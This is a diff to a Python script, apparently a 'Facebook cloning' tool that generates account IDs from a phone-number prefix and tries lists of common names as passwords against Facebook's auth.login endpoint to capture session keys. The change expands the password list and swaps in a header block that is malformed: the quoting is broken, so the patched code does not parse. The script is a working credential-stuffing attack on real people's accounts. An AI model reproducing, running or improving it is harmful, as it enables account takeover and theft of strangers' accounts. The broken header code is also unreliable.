@@ -40,6 +40,7 @@ logo=(f'''{B}
  Guthub   : bipul159
  Facebook : Bipul Khan
  Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}TRAIL{warna}]{warna}
+ Version  : 1.0
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -84,7 +85,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','farjana','jannatul','shakil','tasfiya']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','farjana','jannatul','shakil','tasfiya','ayesha','mababa']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' THE PROGRESS HAS BEEN COMPLETE ')
@@ -104,7 +105,30 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            header={'User-Agent': '['authority': 'm.facebook.com',
+    'accept': '*/*',
+    'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryDp4K0Bh4uM06GxIF',
+    'dpr': '2.43125',
+    'origin': 'https://m.facebook.com',
+    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfddIJQVLLO5DCwvrETtvhKUO8TZyzVXe1WNvx3KG2Zp6n8ALEWsmYZDrL6OwVtxJscnRQdPtoRtDx5FREBJnyhkgqVEZfkAl773sbMaoKo0Ow&smuh=39549&lh=Ac-M48LvoHK7UH-LFdY&wtsid=rdr_0BoTCEbVsc9lSXjJr&_rdr',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"M2101K7BI"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '445',
+    'x-asbd-id': '129477',
+    'x-fb-lsd': 'AVpPFkHCtrc',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream',
+    'x_fb_background_state': '1',}
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
